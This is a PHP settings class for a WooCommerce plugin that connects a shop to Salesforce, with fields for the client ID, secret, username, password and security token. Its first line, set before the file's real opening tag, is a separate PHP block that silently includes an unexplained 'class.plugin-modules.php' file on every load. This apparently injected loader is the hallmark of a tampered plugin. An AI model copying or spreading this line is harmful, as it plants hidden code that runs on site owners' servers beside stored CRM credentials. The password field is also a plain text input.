<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/**
 * WooCommerce Salesforce CRM Settings
 *
 */

if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly

/**
 * WC_Settings_Accounts
 */
class HNSF_Settings extends WC_Settings_Page {
	
	public function __construct() {
		$this->id    = 'hnsf';
		$this->label = __( 'Salesforce Integration',  'hnsf' );
	
		add_filter( 'woocommerce_settings_tabs_array', array( $this, 'add_settings_page' ), 20 );
		add_action( 'woocommerce_settings_' . $this->id, array( $this, 'output' ) );
		add_action( 'woocommerce_settings_save_' . $this->id, array( $this, 'save' ) );
		add_action( 'woocommerce_sections_' . $this->id, array( $this, 'output_sections' ) );
	
		add_action( 'woocommerce_admin_field_addon_settings', array( $this, 'addon_setting' ) );
		add_action( 'woocommerce_admin_field_excludeProduct', array( $this, 'excludeProducts' ) );
	}
	
	/**
	 * Get sections
	 *
	 * @return array
	 */
	public function get_sections() {
	
		$sections = apply_filters( 'woocommerce_add_section_autorelated', array( '' => __( 'Related product', 'hnsf' ) ) );
	
// 		$st = array( 'best_seller' => __( 'Best seller', 'hnsf' ) );
// 		$sections = array_merge($sections, $st);
// 		$st = array( 'recommend' => __( 'Recommend', 'hnsf' ) );
// 		$sections = array_merge($sections, $st);
	
		return apply_filters( 'woocommerce_get_sections_' . $this->id, $sections );
	}
	
	/**
	 * Output sections
	 */
	public function output_sections() {
		global $current_section;
	
		$sections = $this->get_sections();
	
		if ( empty( $sections ) ) {
			return;
		}
	
		echo '<ul class="subsubsub">';
	
		$array_keys = array_keys( $sections );
	
		echo '</ul><br class="clear" />';
	}
	
	/**
	 * Output the settings
	 */
	public function output() {
		global $current_section;
		
		$settings = $this->hnsf_setting();
		
		WC_Admin_Settings::output_fields( $settings );
	}
	
	/**
	 * Save settings
	 */
	public function save() {
		global $current_section;
		
		if( $current_section == '' ) {
			$settings = $this->hnsf_setting();
		} elseif ( $current_section == 'best_seller' ) {
			$settings = $this->hnsf_best_seller_setting();
		} else {
			$settings = $this->hnsf_recommend_setting();
		}
		
		WC_Admin_Settings::save_fields( $settings );
	}
	
	/**
	 * Get settings array
	 *
	 * @return array
	 */
	public function hnsf_setting() {
		$options = '';
		global $wpdb;

		$options = apply_filters( 'woocommerce_hnsf_setting', array(
				
				array( 'title' 		=> __( 'Report fields',  'hnsf'  ), 'type' => 'title' ),
				
				array(
						'title'         => __( 'Client ID',  'hnsf'  ),
						'id'            => 'hnsf_client_id',
						'type'          => 'text'
				),
				
				array(
						'title'         => __( 'Client Secret',  'hnsf'  ),
						'id'            => 'hnsf_client_secret',
						'type'          => 'text'
				),
				
				array(
						'title'         => __( 'Username',  'hnsf'  ),
						'id'            => 'hnsf_username',
						'type'          => 'text'
				),
				
				array(
						'title'         => __( 'Password',  'hnsf'  ),
						'id'            => 'hnsf_password',
						'type'          => 'text'
				),
				
				array(
						'title'         => __( 'Security Token',  'hnsf'  ),
						'id'            => 'hnsf_security_token',
						'type'          => 'text'
				),
				
				array( 'type' => 'sectionend', 'id' => 'product_autorelated_options'),
					
		));
		
		return apply_filters ('hnsf_general_setting', $options );
	}
	
}

return new HNSF_Settings();